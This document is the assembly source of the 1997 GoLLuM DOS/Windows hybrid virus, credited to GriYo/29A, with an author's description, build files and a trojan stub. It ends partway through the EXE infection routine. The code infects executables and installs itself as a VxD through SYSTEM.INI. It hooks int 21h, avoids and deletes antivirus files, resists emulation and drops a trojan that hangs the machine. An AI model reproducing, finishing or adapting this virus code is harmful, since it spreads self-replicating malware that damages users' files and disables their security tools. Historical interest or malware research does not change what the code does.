;
;   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
;   ³   GoLLuM ViRuS - BioCoded by GriYo/29A     ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
;   ³  CopyRight (c) 1997 All RiGhts ReseRVed     ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
;   ³    World's first DOS/Win hybrid ever       ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
;
;  GoLLuM is the very first hybrid DOS-Windows virus ever... it infects DOS
;  EXE files only  when  they're executed  inside a DOS window under any of
;  the known versions of Microsoft Windows (Windows 3.1x, Windows95...). It
;  becomes resident  as a  virtual device driver  when  Windows starts, and
;  then hooks V86 int 21h in order to monitor file execution, trying to in-
;  fect more files under DOS sessions.
;
;  When an EXE file is executed inside a MS-DOS window, GoLLuM  will attach
;  itself to the end of the file (it copies first its DOS code and then the
;  VxD file, both of them encrypted with  a simple 'not' operation). GoLLuM
;  will not infect files that have digits or the 'V' character in their na-
;  mes (this includes AVP, MSAV, CPAV...), as well as Thunderbyte utilities
;  (TB*.*), McAffee shit and F-Prot.
;
;  The virus also deletes some AV database files (ANTI-VIR.DAT, CHKLIST.MS,
;  AVP.CRC, IVB.NTZ and CHKLIST.TAV) whenever it infects a file. When these
;  infected  files  are run, GoLLuM inserts  the string 'DEVICE=GOLLUM.386'
;  into the [386Enh] section of the SYSTEM.INI file, and then drops its VxD
;  file into the Windows \SYSTEM directory.
;
;  The encryption used by GoLLuM  consists on a simple 'not' operation, but
;  the decryptor contains  a little  emulation trick (try  to TbClean it!).
;  Besides, it contains a date-triggered event, in which it  will drop tro-
;  jan files (using the DOS stub in its VxD file).
;
;  I wrote this just for fun while learning something on VxD coding. GoLLuM
;  consists on the following files:
;
;  GOLLUM.ASM        DOS virus code
;  CRYPT.ASM         Code used to encrypt DOS virus code
;  WGOLLUM.MAK       VxD makefile
;  WGOLLUM.DEF       VxD def file
;  VXDSTUB.ASM       VxD stub used in trojans
;  WGOLLUM.ASM       VxD virus code
;  ASSEMBLE.BAT      Batch file used to build GOLLUM.INC
;
; - -[GOLLUM.ASM - DOS virus code]- - - - - - - - - - - - - - - - - - - ->8

I_am_GoLLuM     segment para 'CODE'

Header_Size     equ 1Ch
VxD_File_Size   equ 6592
Decryptor_Size  equ offset Bilbo_Dead
All_Size        equ offset Old_Header+(Header_Size+VxD_File_Size)
        Assume  cs:I_am_GoLLuM,ds:I_am_GoLLuM,es:I_am_GoLLuM,ss:I_am_GoLLuM

;Virus entry point (code inserted intro infected .EXE files)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
GoLLuM_Entry_Point:
        ;Get delta offset stored on infection
        mov bp,0000h
        ;Save segment regs
        push ds
        push es
        ;Point segment regs to our code
        mov ax,cs
        mov ds,ax
        mov es,ax
        ;Decrypt virus and VxD file
        mov si,offset Bilbo_Dead
        add si,bp
        mov di,si
        mov cx,(All_Size-Decryptor_Size+01h)/02h
Decrypt_Gollum:
        
        ;Dont let GoLLum be emulated (Meeethyyyl! ;)
        cld
        lodsw
        push ax
        pop ax
        cli
        sub sp,0002h
        pop ax
        sti
        not ax
        cld
        stosw
        loop Decrypt_Gollum
        ;Clear prefetch
        db 0EBh,00h

;Drop GOLLUM.386 file and insert DEVICE=GOLLUM.386 into SYSTEM.INI
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Bilbo_Dead:
        ;Find SYSTEM.INI file
        mov si,offset Win_Sys_Table
        add si,bp
        mov cx,0005h        
        cld
Search_Loop:
        lodsw
        mov dx,ax
        add dx,bp
        ;Open file (read/write access)
        mov ax,3D02h
        int 21h
        jnc Open_Ok
        ;Try next file name
        loop Search_Loop
        jmp Gollum_Leave
Open_Ok:
        ;Save SYSTEM.INI file handle
        mov word ptr cs:[System_Handle][bp],ax
        ;Build VxD file name        
        mov si,dx
        mov di,offset VxD_File
        add di,bp
        mov dx,di
Copy_Directory:
        lodsb
        cmp al,"."
        je Found_Extension
        stosb
        jmp Copy_Directory
Found_Extension:
        ;Insert the path separator
        mov al,"\"
        stosb
        ;Insert the name of the VxD file
        mov si,offset Device_String+09h
        add si,bp
        mov cx,000Ah
        rep movsb
        ;Put the null marker
        xor al,al
        stosb
        ;Create de VxD file, abort if exist
        mov ah,5Bh
        xor cx,cx
        mov dx,offset VxD_File
        add dx,bp
        int 21h
        jc Close_Sys
        ;Write VxD to file
        xchg bx,ax
        mov ah,40h
        mov dx,offset Old_Header+Header_Size
        add dx,bp
        mov cx,VxD_File_Size
        int 21h
        jnc ok_VxD_Write
        ;Close VxD file if error...
        mov ah,3Eh
        int 21h
        ;...and delete it!
        mov ah,41h
        mov dx,offset VxD_File
        add dx,bp
        int 21h
Close_Sys:
        mov bx,word ptr cs:[System_Handle][bp]
        jmp Exit_Infection
ok_VxD_Write:
        ;Get handle of SYSTEM.INI file
        mov bx,word ptr cs:[System_Handle][bp]
        ;Seek to EOF
        mov ax,4202h
        xor cx,cx
        xor dx,dx
        int 21h
        jc Bad_Size
        ;Strange! SYSTEM.INI file too big
        or dx,dx
        jnz Bad_Size
        cmp ax,VxD_File_Size
        jb Size_Ok
Bad_Size:
        jmp Exit_Infection
Size_Ok:
        ;Save SYSTEM.INI file size
        mov word ptr cs:[System_Size][bp],ax
        ;Seek to BOF
        mov ax,4200h
        xor cx,cx
        xor dx,dx
        int 21h
        jc Bad_Size
        ;Read SYSTEM.INI over VxD file copy
        mov ah,3Fh
        mov cx,word ptr cs:[System_Size][bp]
        mov dx,offset Old_Header+Header_Size
        add dx,bp
        int 21h
        jc bad_size
        ;Check if SYSTEM.INI have been infected
        mov cx,word ptr cs:[System_Size][bp]
        mov di,dx
        mov al,"G"
Do_Inspect:
        cld
        repne scasb
        or cx,cx
        jz System_Clean
        ;Exit if already resident
        cmp word ptr es:[di],"LO" 
        jne Do_Inspect
        cmp word ptr es:[di+02h],"UL" 
        jne Do_Inspect
        jmp Exit_Infection
System_Clean:
        ;Search for [386Enh] string
        mov cx,word ptr cs:[System_Size][bp]
        mov di,dx
Section_Search:
        cld
        mov si,di
        lodsw
        cmp ax,"3["
        jne Next_Char
        lodsw
        cmp ax,"68"
        je Section_Found
Next_Char:
        inc di
        loop Section_Search
        ;Section not found, abort
        jmp Exit_Infection
Section_Found:
        ;Save distance from [386Enh] string to EOF
        mov ax,0008h
        sub cx,ax
        add di,ax
        sub word ptr cs:[System_Size][bp],cx
        ;Seek next to [386Enh] string
        mov ax,4202h
        mov dx,cx
        neg dx
        xor cx,cx
        dec cx
        int 21h
        jc Exit_Infection
        ;Write our load string
        mov ah,40h
        mov cx,0015h
        mov dx,offset Device_String
        add dx,bp
        int 21h
        jc Exit_Infection
        ;Write the rest of SYSTEM.INI file
        mov ah,40h
        mov cx,word ptr cs:[System_Size][bp]
        mov dx,di
        int 21h
Exit_Infection:
        ;Close file (bx=handle)
        mov ah,3Eh
        int 21h

;Get control back to host
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Gollum_Leave:
        ;Restore segment registers
        pop es
        pop ds
        ;File SYSTEM.INI not found, return to host
        mov ah,62h
        int 21h
        add bx,10h
        add word ptr cs:[exe_cs][bp],bx
        ;Restore stack
        cli
        add bx,word ptr cs:[Old_Header+0Eh][bp]
        mov ss,bx
        mov sp,word ptr cs:[Old_Header+10h][bp]
        sti
        ;Clear some regs
        xor ax,ax
        xor bx,bx
        xor cx,cx
        xor dx,dx
        xor si,si
        xor di,di
        xor bp,bp
        ;Clear prefetch
        db 0EBh,00h        
        ;Jump to original entry point
        db 0EAh
exe_ip  dw 0000h
exe_cs  dw 0000h

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                ;String table
Win_Sys_Table   dw offset Win_Sys_01h
                dw offset Win_Sys_02h
                dw offset Win_Sys_03h
                dw offset Win_Sys_04h
                dw offset Win_Sys_05h
                ;Posible locations of SYSTEM.INI file
Win_Sys_01h     db "C:\WINDOWS\SYSTEM.INI",00h        
Win_Sys_02h     db "C:\WIN\SYSTEM.INI",00h        
Win_Sys_03h     db "C:\WIN31\SYSTEM.INI",00h        
Win_Sys_04h     db "C:\WIN311\SYSTEM.INI",00h        
Win_Sys_05h     db "C:\WIN95\SYSTEM.INI",00h        
                ;Buffer where virus build VxD file name and path
VxD_File        db 20h dup (00h)
                ;String inserted into SYSTEM.INI
Device_String   db 0Dh,0Ah,"DEVICE=GOLLUM.386",0Dh,0Ah
                ;Misc data
System_Size     dw 0000h
System_Handle   dw 0000h
                ;Next bytes = Old .EXE header + VxD file copy
Old_Header      equ this byte
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

I_am_GoLLuM     ends
                end GoLLuM_Entry_Point

; - -[CRYPT.ASM - Code used to encrypt DOS virus code]- - - - - - - - - ->8

vir_test  segment para 'CODE'
          Assume  cs:vir_test,ds:vir_test,es:vir_test,ss:vir_test
          org 0000h
Start:
        mov ax,cs
        mov ds,ax
        mov es,ax
        mov ax,3D00h
        mov dx,offset f_name
        int 21h
        jc exit_prog
        xchg bx,ax
        mov ah,3Fh
        mov cx,0FFFFh
        mov dx,offset copy
        int 21h
        jc close_file
        push ax
        mov ah,3Eh
        int 21h
        jc close_file
        mov si,offset copy+0027h
        mov di,si
        mov cx,9000
        cld
encrypt:
        lodsb
        not al
        stosb
        loop encrypt
        mov ah,3Ch
        xor cx,cx
        mov dx,offset x_name
        int 21h
        jc exit_prog
        xchg bx,ax
        mov ah,40h
        mov dx,offset copy
        pop cx
        int 21h
close_file:
        mov ah,3Eh
        int 21h
exit_prog:
        mov ax,4C00h
        int 21h
f_name  db "GOLLUM.BIN",00h
x_name  db "GOLLUM.CRP",00h
copy    db 10000 dup (00h)
vir_test        ends
                end Start

; - -[WGOLLUM.MAK - VxD makefile] - - - - - - - - - - - - - - - - - - - ->8

# file: wgollum.mak (VxD makefile)
all   : wgollum.exe

vxdstub.obj: vxdstub.asm
    masm -Mx -p -w2 vxdstub;

vxdstub.exe: vxdstub.obj
    link vxdstub.obj;

wgollum.obj: wgollum.asm .\debug.inc .\vmm.inc .\shell.inc
        masm5 -p -w2 -Mx $(Debug) wgollum.asm;

objs = wgollum.obj

wgollum.386: vxdstub.exe wgollum.def $(objs)
        link386 @wgollum.lnk
        addhdr wgollum.386
        mapsym32 wgollum

wgollum.exe: wgollum.386
        copy wgollum.386 wgollum.exe

; - -[WGOLLUM.DEF - VxD def file] - - - - - - - - - - - - - - - - - - - ->8

library     wgollum
description 'GoLLuM ViRuS for Microsoft Windows© by GriYo/29A'
stub        'vxdstub.exe'
exetype     dev386

segments
            _ltext preload nondiscardable
            _ldata preload nondiscardable
            _itext class 'icode' discardable
            _idata class 'icode' discardable
            _text  class 'pcode' nondiscardable
            _data  class 'pcode' nondiscardable

; - -[VXDSTUB.ASM - VxD stub used in trojans] - - - - - - - - - - - - - ->8

	name vxdstub
_TEXT   segment word public 'CODE'
	assume cs:_TEXT,ds:_TEXT,es:_TEXT

;Activation routine
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

vxdstub proc far
	;Segment regs!
	mov ax,cs
	mov ds,ax
	mov es,ax
	;Set video mode 80x25x16c
	mov ax,0003h
	int 10h
	;Print "Gollum!"
	mov ax,1301h
	mov bx,0002h
	mov cx,0007h
	mov dx,0A24h
	mov bp,offset Gollum_Says
	int 10h
	;Endless loop
Dead_Zone:        
	;Aaaarrrgggghhhhh!!!!
	jmp Dead_Zone

		;Text printed on screen
Gollum_Says     db "GoLLum!"

vxdstub  endp

_TEXT   ends
	end vxdstub

; - -[WGOLLUM.ASM - VxD virus code] - - - - - - - - - - - - - - - - - - ->8

.386p
;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Includes                                                                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

.XLIST
INCLUDE Vmm.Inc
INCLUDE SheLL.Inc
.LIST

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Virtual device declaration                                              ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

Declare_Virtual_Device WGoLLuM,03h,00h,WGoLLuM_Control,Undefined_Device_ID,,,

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Initialization data segment                                             ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

VxD_IDATA_SEG

VxD_Installation_Title  db "GoLLuM ViRuS by GriYo/29A",00h
VxD_Installation_Msg    db "Deep down here by the dark water lived old "
			db "Gollum, a small slimy creature. I dont know "
			db "where he came from, nor who or what he was. "
			db "He was a Gollum -as dark as darkness, except "
			db "for two big round pale eyes in his thin face."
			db 0Dh,0Ah,0Dh,0Ah
			db "J.R.R. ToLkieN ... The HoBBit"
			db 0Dh,0Ah,0Dh,0Ah
			db 00h

VxD_IDATA_ENDS

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Local locked data segment                                               ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

VxD_LOCKED_DATA_SEG

Header_Size             equ 001Ch                ;Dos .EXE header size
VxD_Size                equ 6592                 ;VxD file size
			ALIGN DWORD
DOS_Virus_Code          equ this byte            ;Start of Dos virus code
			include gollum.inc       ;Load Dos virus code
Header_Copy             db Header_Size dup (00h) ;Buffer for old .EXE header
DOS_Virus_End           equ this byte
DOS_Virus_Size          equ (DOS_Virus_End-DOS_Virus_Code)
Our_Own_Call_Flag       db "EERF"                    ;Dos call from virus?
File_Size               dd 00000000h                 ;Size of file to infect
Start_FileName          dd 00000000h                 ;Filename start
VxD_Buffer              db 0200h dup (00h)           ;VxD file copy
Infect_FileName         db 80h dup (00h)             ;Last executed file
File_Header             db Header_Size dup (00h)     ;Infected .EXE header
VxD_File_Name           db 80h dup (00h)             ;Path of virus VxD
Gollum_Name             db "GOLLUM.386",00h          ;Name of virus VxD file
Trojan_File_Name        db "GOLLUM.EXE",00h          ;Generated trojans
CheckSum_File_00:       db "ANTI-VIR.DAT",00h        ;Names of av databases
CheckSum_File_01:       db "CHKLIST.TAV",00h
CheckSum_File_02:       db "CHKLIST.MS",00h
CheckSum_File_03:       db "AVP.CRC",00h
CheckSum_File_04:       db "IVB.NTZ",00h
Gollum_Handle           dw 0000h                     ;VxD file handle
Victim_Handle           dw 0000h                     ;Victim file handle
File_Attr               dw 0000h                     ;Victim file attr
File_Time               dw 0000h                     ;Victim file time
File_Date               dw 0000h                     ;Victim file date

VxD_LOCKED_DATA_ENDS

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Initialization code segment                                             ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

VxD_ICODE_SEG

;This is the virus startup code (Sys_Critical_Init)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

BeginProc WGoLLuM_Sys_Critical_Init
	
	;Get path of WIN386.EXE
	VMMCall Get_Exec_Path
	;Copy path to our buffer
	mov esi,edx
	mov edi,OFFSET32 VxD_File_Name
	cld
	rep movsb
	mov esi,OFFSET32 Gollum_Name
	mov ecx,0Bh
	cld
	rep movsb
	;Return, Sys_Critical_Init complete
	clc
	ret

EndProc WGoLLuM_Sys_Critical_Init

;This is the virus startup code (Device_Init)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

BeginProc WGoLLuM_Device_Init
	
	;Hook int 21h so we can monitor dos file operations
	mov eax,21h
	mov esi,OFFSET32 VxD_Int_21h
	VMMcall Hook_V86_Int_Chain
	clc
	ret

EndProc WGoLLuM_Device_Init

;This is the virus startup code (Init_Complete)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

BeginProc WGoLLuM_Init_Complete

	;Check current date
	mov ah,04h
	VxDint 1Ah
	cmp dx,0604h
        jne short Not_Yet
	;Display instalation msg
	VMMCall Get_SYS_VM_Handle
	xor eax,eax
	mov ecx,OFFSET32 VxD_Installation_Msg
	mov edi,OFFSET32 VxD_Installation_Title
	VxDcall Shell_SYSMODAL_Message
Not_Yet:
	;Return, Sys_Critical_Init complete
	clc
	ret

EndProc WGoLLuM_Init_Complete

VxD_ICODE_ENDS

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Locked code segment                                                     ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

VxD_LOCKED_CODE_SEG

;This is a call-back routine to handle the messages that are sent
;to VxD's to control system operation
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

BeginProc WGoLLuM_Control

        Control_Dispatch Sys_Critical_Init, WGoLLuM_Sys_Critical_Init
        Control_Dispatch Device_Init, WGoLLuM_Device_Init       
        Control_Dispatch Init_Complete, WGoLLuM_Init_Complete
	clc
	ret

EndProc WGoLLuM_Control

;This is the virus int 21h handler
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

BeginProc VxD_Int_21h, High_Freq
	
	;Save regs
	pushad
	;Check for our own calls (avoid recursive int 21h calls)
	cmp dword ptr [Our_Own_Call_Flag],"BUSY"
        je short Exit_VxD_Int_21h
	;Set flag
	mov dword ptr [Our_Own_Call_Flag],"BUSY"
	;Get called function
	mov ax,word ptr [ebp.Client_AX]        
	;Check for Exec function calls
	cmp ax,4B00h
        je short Store_FileName
	;Check for Terminate with error-code 00h function calls
	cmp ax,4C00h
        je short Infect_Stored_FileName
	cmp ah,3Bh
	je Drop_Exe_Trojan
Exit_VxD_Int_21h:
	;Clear flag
	mov dword ptr [Our_Own_Call_Flag],"FREE"
	;Restore regs
	popad
	;Int not served yet
	stc
	ret

;Save file name for later infection
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Store_FileName:        
	;Save filename into our buffer
	movzx edx,word ptr [ebp.Client_DX]
	movzx eax,word ptr [ebp.Client_DS]
	shl eax,04h
	add eax,edx
	mov esi,eax
	mov edi,OFFSET32 Infect_FileName
Go_Thru_Filename:
	cld
	lodsb
	stosb
	or al,al
	jnz Go_Thru_Filename
	jmp Exit_VxD_Int_21h

;Infect stored file name
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Infect_Stored_FileName:
	;Check if working on C: drive
	mov esi,OFFSET32 Infect_FileName
	cmp word ptr [esi],":C"
	jne Infect_Error
Look_End:        
        ;Find null marker into filename
	cld
	lodsb
	or al,al
	jnz Look_End
Found_Tail:
	;Search begin of file name
	dec esi
	mov ecx,0080h
Look_Start:
	std
	lodsb
	;Do not infect files with V character in their names
	cmp al,"V"
	je Infect_Error
	;Do not infect files with digit in their names
	cmp al,"0"
        jb short Check_Start
	cmp al,"9"
	jbe Infect_Error
Check_Start:
	cmp al,"\"
        je short Check_Names
	loop Look_Start
	;Begin of file name not found, tchhh...
	jmp Infect_Error
Check_Names:
	inc esi
	inc esi
	;Save pointer to file name start
	mov dword ptr [Start_FileName],esi
	cld
	lodsd
        ;Check for SCAN
	cmp eax,"NACS"
	je Infect_Error
	;Check for F-PROT
	cmp eax,"RP-F"
	je Infect_Error  
	;Avoid THUNDERBYTE shit
	cmp ax,"BT"
	je Infect_Error  
	;Get file attr
	mov ax,4300h
	mov edx,OFFSET32 Infect_FileName
	VxDint 21h
	jc Infect_Error
	;Save file attr
	mov word ptr [file_attr],cx
	;Wipe out attr
	mov ax,4301h
	xor cx,cx
	VxDint 21h
	jc Infect_Error
	;Open file to infect
	mov ax,3D02h
	mov edx,OFFSET32 Infect_FileName
	VxDint 21h
	jc Restore_Attr
	;Get file handler
	mov word ptr [Victim_Handle],ax
	xchg bx,ax
	;Get file date/time
	mov ax,5700h
	VxDint 21h
	jc Infect_Close
	;Save file date time
	mov word ptr [File_Time],cx
	mov word ptr [File_Date],dx
	;Read file header
	mov ah,3Fh
	mov ecx,Header_Size
	mov edx,OFFSET32 File_Header
	VxDint 21h        
	jc Restore_Date_Time
	;Seek to EOF and get real file size
	call Seek_File_End
	jc Restore_Date_Time
	;Do not infect too small files
	cmp eax,DOS_Virus_Size+VxD_Size
	jbe Restore_Date_Time
Test_EXE_File:        
	;Point esi to file header
	mov esi,OFFSET32 File_Header
	;Check dos .EXE file type mark
	cmp word ptr [esi],"ZM"
	jne Restore_Date_Time
	;Check if file is infected
	cmp word ptr [esi+12h],"CR"
	je Restore_Date_Time
	;Don't infect Windows files or above
	cmp word ptr [esi+19h],0040h
	jae Restore_Date_Time
	;Don't infect overlays
	cmp word ptr [esi+1Ah],0000h
	jne Restore_Date_Time
	;Check maxmem field
	cmp word ptr [esi+0Ch],0FFFFh
	jne Restore_Date_Time
	;Save entry point
	push eax
	mov eax,dword ptr [esi+14h]
	;Crypt it!
	not eax
	mov dword ptr [DOS_Virus_Code+0177h],eax
	pop eax
	;Make a copy of .exe file header
	push esi
	mov edi,OFFSET32 Header_Copy        
	mov ecx,Header_Size
Copy_Loop:        
	cld
	lodsb
	not al
	stosb
	loop Copy_Loop
	pop esi
	;Get file size into dx:ax
	mov eax,dword ptr [File_Size]
	mov edx,eax
	shr edx,10h
	;Get file size div 10h
	mov cx,0010h
	div cx
	;Sub header size
	sub ax,word ptr [esi+08h]
	;New entry point at EOF
	mov word ptr [esi+14h],dx
	mov word ptr [esi+16h],ax
	;Save delta offset
	mov word ptr [DOS_Virus_Code+0001h],dx
	;Set new offset of stack segment in load module
	inc ax
	mov word ptr [esi+0Eh],ax
	;Set new stack pointer beyond end of virus
	add dx,DOS_Virus_Size+VxD_Size+0200h
	;Aligment
	and dx,0FFFEh
	mov word ptr [esi+10h],dx
	;Get file size into dx:ax
	mov eax,dword ptr [File_Size]
	mov edx,eax
	shr edx,10h
	;Get file size div 0200h
	mov cx,0200h
	div cx
	or dx,dx
        jz short Size_Round_1
	inc ax
Size_Round_1:
	;Check if file size is as header says
	cmp ax,word ptr [esi+04h]
	jne Restore_Date_Time
	cmp dx,word ptr [esi+02h]
	jne Restore_Date_Time
	;Get file size into dx:ax
	mov eax,dword ptr [File_Size]
	mov edx,eax
	shr edx,10h
	;Add virus size to file size
	add ax,DOS_Virus_Size+VxD_Size
	adc dx,0000h
	;Get infected file size div 0200h
	mov cx,0200h
	div cx
	or dx,dx
        jz short Size_Round_2
	inc ax
Size_Round_2:
	;Store new size
	mov word ptr [esi+02h],dx
	mov word ptr [esi+04h],ax
	;Write DOS virus area next to EOF
	mov ah,40h
	mov ecx,DOS_Virus_Size
	mov edx,OFFSET32 DOS_Virus_Code
	VxDint 21h                
	jc Restore_Date_Time
	;Open Gollum VxD file
	mov ax,3D00h
	mov edx,OFFSET32 VxD_File_Name
	VxDint 21h
	jc Restore_Date_Time
	;Save file handler
	mov word ptr [Gollum_Handle],ax
Read_VxD_Block:
	;Read VxD file block
	mov ah,3Fh
	mov bx,word ptr [Gollum_Handle]
	mov ecx,0200h
	mov edx,OFFSET32 VxD_Buffer
	VxDint 21h
	push eax
	;Encrypt block
	mov esi,edx
	mov edi,edx
	mov cx,0200h
Crypt_Loop_3:
	cld
	lodsb
	not al
	stosb
	loop Crypt_Loop_3
	;Write block        
	pop ecx
	mov ah,40h
	mov bx,word ptr [Victim_Handle]
	VxDint 21h        
	cmp cx,0200h
	je Read_VxD_Block
	;Close file
	mov bx,word ptr [Gollum_Handle]
	mov ah,3Eh
	VxDint 21h
	;Seek to beginning of file
	mov bx,word ptr [Victim_Handle]
	call Seek_File_Start
	;Mark file as infected
	mov esi,OFFSET32 File_Header
